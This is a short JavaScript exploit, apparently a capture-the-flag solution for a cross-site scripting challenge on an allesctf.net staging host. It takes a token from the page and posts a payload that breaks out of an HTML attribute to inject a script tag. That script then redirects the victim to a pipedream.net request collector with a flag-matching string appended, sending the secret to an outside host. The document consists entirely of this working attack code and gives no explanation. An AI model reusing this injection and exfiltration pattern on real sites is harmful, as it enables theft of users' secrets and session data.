var a = /[a-f0-9]{13}/.exec(document.body.innerHTML);
var b = '<script> window.location.href = "https://en5ocv9177twt.x.pipedream.net/" + /CSCG{.*}/.exec(document.body.innerHTML); </script>';
var c = 'id"><form name="backgrounds" id="' + b + '"></form><a href="';
fetch("http://stage2.xss.allesctf.net/?token=" + a, {headers: {"Content-type": "application/x-www-form-urlencoded"}, method: "POST", body: "bg=" + c, credentials: "include", mode: "no-cors"});
window.location.href = "http://stage2.xss.allesctf.net/?token=" + a;


